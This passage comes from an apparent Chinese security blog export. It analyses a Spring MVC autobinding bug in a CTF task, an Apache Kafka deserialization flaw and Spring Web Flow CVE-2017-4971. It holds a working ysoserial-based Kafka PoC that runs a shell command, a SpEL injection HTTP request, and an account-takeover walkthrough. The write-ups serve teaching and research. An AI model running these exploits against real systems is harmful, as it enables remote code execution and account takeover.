中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享</p>\n<a id=\"more\"></a>\n<h2 id=\"Justice-League\"><a href=\"#Justice-League\" class=\"headerlink\" title=\"Justice League\"></a>Justice League</h2><p>justice league是ZeroNigths HackQuest2016的一个web任务，为了让更多的人认识到自动绑定这一类型的漏洞而设计。源码下载地址: <a href=\"https://github.com/3wapp/ZeroNights-HackQuest-2016。\" target=\"_blank\" rel=\"noopener\">https://github.com/3wapp/ZeroNights-HackQuest-2016。</a></p>\n<p>站点实现了注册登录忘记密码等功能，逻辑比较简单。<br><img src=\"/2017/07/22/Spring-MVC-自动绑定漏洞/001.png\"></p>\n<p>先注册一个账号，了解站点流程逻辑。<br><img src=\"/2017/07/22/Spring-MVC-自动绑定漏洞/002.png\"></p>\n<p>注册成功，登录后home出现提示信息，没有权限不能访问敏感信息，显然，第一步要拥有一个有权限的账号登录，那么忘记密码功能就很可能是突破点了。</p>\n<p>忘记密码会先检查用户名，然后回答密保问题，回答成功就重置密码，明显，密保问题是关键，怎样知道管理员的用户名和密保很关键。先用test用户尝试去绕过密保问题重置密码，那么可以利用自动绑定漏洞重置密保问题，在第一步检查用户名，尝试添加参数<code>answer=yellow</code>，在第二步输入密保问题答案为: <code>yellow</code>时，发现回答错误，也就是利用自动绑定漏洞失败，极有可能第一步没有获取<code>answer</code>参数赋值给user对象，尝试在第二步中加入，answer参数，发现重置密码成功。<br><img src=\"/2017/07/22/Spring-MVC-自动绑定漏洞/003.png\"></p>\n<p>证明利用自动绑定漏洞成功。剩下的就只是找出管理员的用户名了，爆破用户名有user用户和admin用户。后续通过重置密保问题来重置密码就是一样的步骤了。<br><img src=\"/2017/07/22/Spring-MVC-自动绑定漏洞/004.png\"></p>\n<p>查看源码发现，检查用户名部分，只读取了username参数，根据username判断生成user实例，用户存在则放入Model中，ResetPasswordController类使用SessionAttribute(“user”)注解，则会自动把对象放入session中. 而后在resetViewQuestionHandler函数中，参数使用了<code>ModelAttribute</code>注解，会自动从session中提取出user，这仅仅只是处理GET请求。处理POST请求的resetQuestionHandler函数中 user参数附近并没有使用<code>ModelAttribute</code>注解，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@SessionAttributes</span>(<span class=\"string\">\"user\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ResetPasswordController</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Logger logger = LoggerFactory.getLogger(ResetPasswordController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> UserService userService;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@RequestMapping</span>(value = <span class=\"string\">\"/reset\"</span>, method = RequestMethod.GET)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">resetViewHandler</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tlogger.info(<span class=\"string\">\"Welcome reset ! \"</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"reset\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">@RequestMapping</span>(value = <span class=\"string\">\"/reset\"</span>, method = RequestMethod.POST)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">resetHandler</span><span class=\"params\">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class=\"line\">\t\tlogger.info(<span class=\"string\">\"Checking username \"</span> + username);</span><br><span class=\"line\">\t\tUser user = userService.findByName(username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (user == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tlogger.info(<span class=\"string\">\"there is no user with name \"</span> + username);</span><br><span class=\"line\">\t\t\tmodel.addAttribute(<span class=\"string\">\"error\"</span>, <span class=\"string\">\"Username is not found\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"reset\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tmodel.addAttribute(<span class=\"string\">\"user\"</span>, user);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"redirect:resetQuestion\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@RequestMapping</span>(value = <span class=\"string\">\"/resetQuestion\"</span>, method = RequestMethod.GET)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">resetViewQuestionHandler</span><span class=\"params\">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class=\"line\">\t\tlogger.info(<span class=\"string\">\"Welcome resetQuestion ! \"</span> + user);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"resetQuestion\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@RequestMapping</span>(value = <span class=\"string\">\"/resetQuestion\"</span>, method = RequestMethod.POST)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">resetQuestionHandler</span><span class=\"params\">(@RequestParam String answerReset, SessionStatus status,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">\t\t\tUser user, Model model)</span> </span>&#123;</span><br><span class=\"line\">\t\tlogger.info(<span class=\"string\">\"Checking resetQuestion ! \"</span> + answerReset + <span class=\"string\">\" for \"</span> + user);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class=\"line\">\t\t\tlogger.info(<span class=\"string\">\"Answer in db \"</span> + user.getAnswer() + <span class=\"string\">\" Answer \"</span> + answerReset);</span><br><span class=\"line\">\t\t\tmodel.addAttribute(<span class=\"string\">\"error\"</span>, <span class=\"string\">\"Incorrect answer\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"resetQuestion\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstatus.setComplete();</span><br><span class=\"line\">\t\tString newPassword = GeneratePassword.generatePassowrd(<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\tuser.setPassword(newPassword);</span><br><span class=\"line\">\t\tuserService.updateUser(user);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmodel.addAttribute(<span class=\"string\">\"message\"</span>, <span class=\"string\">\"Your new password is \"</span> + newPassword);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"success\"</span>;</span><br></pre></td></tr></table></figure>\n<p>那么在处理get和post请求都是存在自动绑定漏洞的，测试get请求如下:</p>\n<p><code>http://127.0.0.1:8080/justiceleague/resetQuestion?answer=cc</code>,后台可以看到: <code>16:28:46 INFO  ResetPasswordController:50 - Welcome resetQuestion ! User [username=test, password=ZG3t0yorB9, isSupaAdministrata=false, email=abc@qq.com, answer=cc]</code>，密保问题重置成功。</p>\n<p>Spring MVC确实太聪明了，POST请求处理中没有使用<code>ModelAttribute</code>注解，竟然和GET请求处理使用相同的逻辑，这种隐形的坑怕是埋了不少雷吧。</p>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><ul>\n<li><a href=\"http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html\" target=\"_blank\" rel=\"noopener\">Autobinding vulns and Spring MVC</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=l5hU1Hq-gsA\" target=\"_blank\" rel=\"noopener\">video from the 29thmeeting of Defcon Russia Group (in Russian)</a></li>\n<li><a href=\"https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet\" target=\"_blank\" rel=\"noopener\">https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet</a></li>\n<li><a href=\"https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf\" target=\"_blank\" rel=\"noopener\">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a></li>\n<li><a href=\"http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html\" target=\"_blank\" rel=\"noopener\">http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html)</a></li>\n</ul>\n","categories":["Web安全"],"tags":["JAVA","Spring MVC"]},{"title":"【漏洞分析】Apache kafka反序列化漏洞","url":"http://www.beesfun.com/2017/07/20/【漏洞分析】Apache-kafka反序列化漏洞/","content":"<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>Apache kafka组件反序列化漏洞是FileOffsetBackingStore类在反序列化本地文件时引发的，实际场景中用到的并不多，简单复现下做个记录。</p>\n<a id=\"more\"></a>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>测试源码如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.commons.io.FileUtils;</span><br><span class=\"line\">import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;</span><br><span class=\"line\">import org.apache.kafka.connect.storage.FileOffsetBackingStore;</span><br><span class=\"line\">import ysoserial.payloads.Jdk7u21;</span><br><span class=\"line\">import ysoserial.payloads.CommonsCollections4;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.File;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.ObjectOutputStream;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by js on 2017/7/20.</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class KafkaPoc &#123;</span><br><span class=\"line\">    public static void testKafkaDeser() throws Exception &#123;</span><br><span class=\"line\">        StandaloneConfig config;</span><br><span class=\"line\">        String projectDir = System.getProperty(&quot;user.dir&quot;);</span><br><span class=\"line\">        CommonsCollections4 cc4 = new CommonsCollections4();</span><br><span class=\"line\">        Object o = cc4.getObject(&quot;touch vul&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">//        Jdk7u21 jdk7u21 = new Jdk7u21();</span><br><span class=\"line\">//        Object o = jdk7u21.getObject(&quot;touch vul&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        byte[] ser = serialize(o);</span><br><span class=\"line\"></span><br><span class=\"line\">        File tempFile = new File(projectDir + &quot;/payload.ser&quot;);</span><br><span class=\"line\">        FileUtils.writeByteArrayToFile(tempFile, ser);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;String, String&gt; props = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG, tempFile.getAbsolutePath());</span><br><span class=\"line\">        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;);</span><br><span class=\"line\">        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;);</span><br><span class=\"line\">        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;);</span><br><span class=\"line\">        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;);</span><br><span class=\"line\">        config = new StandaloneConfig(props);</span><br><span class=\"line\"></span><br><span class=\"line\">        FileOffsetBackingStore restore = new FileOffsetBackingStore();</span><br><span class=\"line\">        restore.configure(config);</span><br><span class=\"line\">        restore.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static byte[] serialize(Object object) throws IOException &#123;</span><br><span class=\"line\">        ByteArrayOutputStream bout = new ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = new ObjectOutputStream(bout);</span><br><span class=\"line\">        out.writeObject(object);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        return bout.toByteArray();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws Exception&#123;</span><br><span class=\"line\">        KafkaPoc.testKafkaDeser();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>pom.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;org.poc&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;kafkatest&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;connect-runtime&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;0.11.0.0&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;!-- https://mvnrepository.com/artifact/org.apache.kafka/connect-json --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;connect-json&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;0.11.0.0&lt;/version&gt;</span><br><span class=\"line\">        &lt;!--&lt;scope&gt;test&lt;/scope&gt;--&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<p>执行程序会在本地新建一个名为”vul”的文件，证明漏洞存在。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>上面验证代码逻辑简单，写的比较清晰，不具体分析了。可以看看FileOffsetBackingStore类的实现，<code>configure</code>方法获取<code>&quot;offset.storage.file.filename&quot;</code>指定的值实例化一个文件对象，<code>start</code>方法调用会调用<code>load</code>方法，而<code>load</code>方法中反序列化之前实例化的文件对象，触发反序列漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileOffsetBackingStore extends MemoryOffsetBackingStore &#123;</span><br><span class=\"line\">    private static final Logger log = LoggerFactory.getLogger(FileOffsetBackingStore.class);</span><br><span class=\"line\">    private File file;</span><br><span class=\"line\"></span><br><span class=\"line\">    public FileOffsetBackingStore() &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void configure(WorkerConfig config) &#123;</span><br><span class=\"line\">        super.configure(config);</span><br><span class=\"line\">        this.file = new File(config.getString(&quot;offset.storage.file.filename&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public synchronized void start() &#123;</span><br><span class=\"line\">        super.start();</span><br><span class=\"line\">        log.info(&quot;Starting FileOffsetBackingStore with file &#123;&#125;&quot;, this.file);</span><br><span class=\"line\">        this.load();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public synchronized void stop() &#123;</span><br><span class=\"line\">        super.stop();</span><br><span class=\"line\">        log.info(&quot;Stopped FileOffsetBackingStore&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void load() &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            ObjectInputStream is = new ObjectInputStream(new FileInputStream(this.file));</span><br><span class=\"line\">            Object obj = is.readObject();</span><br><span class=\"line\">            if(!(obj instanceof HashMap)) &#123;</span><br><span class=\"line\">                throw new ConnectException(&quot;Expected HashMap but found &quot; + obj.getClass());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            Map&lt;byte[], byte[]&gt; raw = (Map)obj;</span><br><span class=\"line\">            this.data = new HashMap();</span><br><span class=\"line\">            Iterator i$ = raw.entrySet().iterator();</span><br><span class=\"line\"></span><br><span class=\"line\">            while(i$.hasNext()) &#123;</span><br><span class=\"line\">                Entry&lt;byte[], byte[]&gt; mapEntry = (Entry)i$.next();</span><br><span class=\"line\">                ByteBuffer key = mapEntry.getKey() != null?ByteBuffer.wrap((byte[])mapEntry.getKey()):null;</span><br><span class=\"line\">                ByteBuffer value = mapEntry.getValue() != null?ByteBuffer.wrap((byte[])mapEntry.getValue()):null;</span><br><span class=\"line\">                this.data.put(key, value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            is.close();</span><br><span class=\"line\">        &#125; catch (EOFException | FileNotFoundException var8) &#123;</span><br><span class=\"line\">            ;</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException | IOException var9) &#123;</span><br><span class=\"line\">            throw new ConnectException(var9);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><ul>\n<li><a href=\"http://seclists.org/oss-sec/2017/q3/184\" target=\"_blank\" rel=\"noopener\">http://seclists.org/oss-sec/2017/q3/184</a></li>\n<li><a href=\"http://www.polaris-lab.com/index.php/archives/345/\" target=\"_blank\" rel=\"noopener\">http://www.polaris-lab.com/index.php/archives/345/</a></li>\n</ul>\n","categories":["Web安全"],"tags":["反序列化","JAVA"]},{"title":"【漏洞分析】Spring Web Flow框架远程代码执行(CVE-2017-4971)","url":"http://www.beesfun.com/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/","content":"<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p><strong>漏洞是由于Spring Web Flow的数据绑定问题带来的表达式注入，从而导致任意代码执行。</strong> Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，具体可以参考<a href=\"https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html\" target=\"_blank\" rel=\"noopener\">Spring Web Flow 2.0 入门</a>。</p>\n<a id=\"more\"></a>\n<p><strong>触发漏洞需要满足两个条件：</strong></p>\n<ul>\n<li><code>MvcViewFactoryCreator</code> 对象的<code>useSpringBeanBinding</code> 参数需要设置为<code>false</code>（默认值）。</li>\n<li>flow <code>view</code>对象中设置<code>BinderConfiguration</code>对象为空</li>\n</ul>\n<p><strong>影响版本：</strong></p>\n<ul>\n<li>Spring Web Flow 2.4.0 to 2.4.4</li>\n<li>Older unsupported versions are also affected</li>\n</ul>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>漏洞测试源码为 <a href=\"https://github.com/spring-projects/spring-webflow-samples/tree/master/booking-mvc\" target=\"_blank\" rel=\"noopener\">https://github.com/spring-projects/spring-webflow-samples/tree/master/booking-mvc</a>， 来源于Spring Web Flow官方的Example中的例子，booking-mvc中的某个流满足漏洞触发的条件</p>\n<ul>\n<li>flow <code>view</code>对象中设置<code>BinderConfiguration</code>对象为空</li>\n</ul>\n<p>path: src/main/webapp/WEB-INF/hotels/booking/booking-flow.xml<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/003.png\"><br>可以看出booking model中的confirm没有设置binder，也就是说在confirm阶段是可以触发漏洞的。</p>\n<ul>\n<li><code>useSpringBeanBinding</code> 参数设置为<code>false</code><br>参数默认是false, 但是在官方例子中设置为<code>true</code>了, 需要改源码如下:</li>\n</ul>\n<p>path: src/main/java/org/springframework/webflow/samples/booking/config/WebFlowConfig.java<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/004.png\"><br>修改源码后，部署环境，然后访问，随便选取一个酒店进行预定。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/001.png\"></p>\n<p>预定第二步拦截确认请求，增加post参数<code>_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</code>如下，返回响应头中包含<code>vulnerable: True</code>, 验证漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /hotels/booking?execution=e1s2 HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 203</span><br><span class=\"line\">Referer: http://127.0.0.1:8080/hotels/booking?execution=e1s2</span><br><span class=\"line\">Cookie: JSESSIONID=BF4269E94E8F9108D72B2FB9864C6E53</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\">_eventId_confirm=&amp;_csrf=92a961cd-69f5-4436-8834-a9b1e33ca87a&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP/1.1 302 </span><br><span class=\"line\">X-Content-Type-Options: nosniff</span><br><span class=\"line\">X-XSS-Protection: 1; mode=block</span><br><span class=\"line\">Cache-Control: no-store</span><br><span class=\"line\">Pragma: </span><br><span class=\"line\">Expires: </span><br><span class=\"line\">X-Frame-Options: DENY</span><br><span 